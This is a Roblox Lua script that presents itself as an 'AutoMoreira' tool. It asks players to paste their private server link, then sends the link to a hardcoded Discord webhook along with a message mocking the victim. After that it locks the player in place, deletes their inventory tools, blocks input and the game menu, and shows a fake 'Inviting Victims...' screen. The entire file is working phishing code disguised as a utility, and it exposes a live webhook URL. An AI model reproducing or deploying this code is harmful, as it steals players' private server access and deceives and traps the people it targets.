local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local GuiService = game:GetService("GuiService")
local StarterGui = game:GetService("StarterGui")
local plr = Players.LocalPlayer

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

local webhookUrl = "https://discord.com/api/webhooks/1457783495500763178/71aKmoSUYs8AFGxObb-R0diNRu9FoID32NBK-0Of3MGEEyofYCbkkR_x-alrxo0T7J2M"

local sg = Instance.new("ScreenGui", plr.PlayerGui)
sg.Name = "AutoMoreiraGui"
sg.ResetOnSpawn = false

local inputFrame = Instance.new("Frame", sg)
inputFrame.Size = UDim2.new(0, 320, 0, 60)
inputFrame.Position = UDim2.new(0.5, -160, 0.5, -30)
inputFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputFrame.BorderSizePixel = 0
local uc = Instance.new("UICorner", inputFrame)
uc.CornerRadius = UDim.new(0, 10)

local title = Instance.new("TextLabel", inputFrame)
title.Size = UDim2.new(1, 0, 0.5, 0)
title.Text = "Enter your private server link to start AutoMoreira"
title.TextColor3 = Color3.new(1,1,1)
title.BackgroundTransparency = 1
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextWrapped = true

local inputBox = Instance.new("TextBox", inputFrame)
inputBox.Size = UDim2.new(0.9, 0, 0.4, 0)
inputBox.Position = UDim2.new(0.05, 0, 0.55, 0)
inputBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
inputBox.TextColor3 = Color3.new(1,1,1)
inputBox.Font = Enum.Font.Gotham
inputBox.TextSize = 14
inputBox.PlaceholderText = "Paste PS link here"
local ucb = Instance.new("UICorner", inputBox)
ucb.CornerRadius = UDim.new(0, 6)

local startBtn = Instance.new("TextButton", inputFrame)
startBtn.Size = UDim2.new(0.4, 0, 0.3, 0)
startBtn.Position = UDim2.new(0.3, 0, 1.1, 0)
startBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
startBtn.TextColor3 = Color3.new(1,1,1)
startBtn.Text = "Start"
startBtn.Font = Enum.Font.GothamBold
startBtn.TextSize = 14
local ucbtn = Instance.new("UICorner", startBtn)
ucbtn.CornerRadius = UDim.new(0, 6)

local invalidLabel = Instance.new("TextLabel", inputFrame)
invalidLabel.Size = UDim2.new(1, 0, 0.3, 0)
invalidLabel.Position = UDim2.new(0, 0, 1.5, 0)
invalidLabel.Text = "Invalid Link!"
invalidLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
invalidLabel.BackgroundTransparency = 1
invalidLabel.Font = Enum.Font.Gotham
invalidLabel.TextSize = 14
invalidLabel.Visible = false

local function sendToWebhook(link)
    local data = {
        content = "MAIS UM MLK QUE TENTOU SCAMMAR E FOI SCAMMADO 🤑🔥\nLink PS: " .. link,
        username = "AutoMoreira Bot"
    }
    local success, err = pcall(function()
        HttpService:PostAsync(
            webhookUrl,
            HttpService:JSONEncode(data),
            Enum.HttpContentType.ApplicationJson,
            false,
            {["Content-Type"] = "application/json"}
        )
    end)
end

local function lockPlayer()
    UserInputService.MouseBehavior = Enum.MouseBehavior.LockCenter
    if plr.Character and plr.Character:FindFirstChild("Humanoid") then
        plr.Character.Humanoid.WalkSpeed = 0
        plr.Character.Humanoid.JumpPower = 0
        plr.Character.HumanoidRootPart.Anchored = true
    end
    plr.CharacterAdded:Connect(function(char)
        char:WaitForChild("Humanoid").WalkSpeed = 0
        char:WaitForChild("Humanoid").JumpPower = 0
        char:WaitForChild("HumanoidRootPart").Anchored = true
    end)
    for _, tool in pairs(plr.Backpack:GetChildren()) do
        tool:Destroy()
    end
    UserInputService.InputBegan:Connect(function(input, processed)
        if not processed then
            return Enum.ContextActionResult.Sink
        end
    end)
    GuiService.MenuOpened:Connect(function()
        GuiService:CloseMenu()
    end)
end

local function showFullScreen()
    inputFrame.Visible = false
    inputBox.Visible = false
    startBtn.Visible = false
    invalidLabel.Visible = false

    local fullFrame = Instance.new("Frame", sg)
    fullFrame.Size = UDim2.new(1, 0, 1, 0)
    fullFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    fullFrame.BorderSizePixel = 0

    local startingLabel = Instance.new("TextLabel", fullFrame)
    startingLabel.Size = UDim2.new(1, 0, 0.2, 0)
    startingLabel.Position = UDim2.new(0, 0, 0.4, 0)
    startingLabel.Text = "AutoMoreira Starting..."
    startingLabel.TextColor3 = Color3.new(1,1,1)
    startingLabel.BackgroundTransparency = 1
    startingLabel.Font = Enum.Font.GothamBold
    startingLabel.TextSize = 30
    startingLabel.TextWrapped = true

    local invitingLabel = Instance.new("TextLabel", fullFrame)
    invitingLabel.Size = UDim2.new(1, 0, 0.2, 0)
    invitingLabel.Position = UDim2.new(0, 0, 0.6, 0)
    invitingLabel.Text = "Inviting Victims..."
    invitingLabel.TextColor3 = Color3.new(1,1,1)
    invitingLabel.BackgroundTransparency = 1
    invitingLabel.Font = Enum.Font.Gotham
    invitingLabel.TextSize = 24
    invitingLabel.TextWrapped = true
end

startBtn.MouseButton1Click:Connect(function()
    local link = inputBox.Text:match("^%s*(.-)%s*$") or ""
    if (link:match("roblox%.com/games/109983668079237") or link:match("roblox%.com/share")) and (link:match("code=") or link:match("privateServerLinkCode")) then
        invalidLabel.Visible = false
        sendToWebhook(link)
        lockPlayer()
        showFullScreen()
    else
        invalidLabel.Visible = true
        invalidLabel.Text = "Invalid Link!"
    end
end)
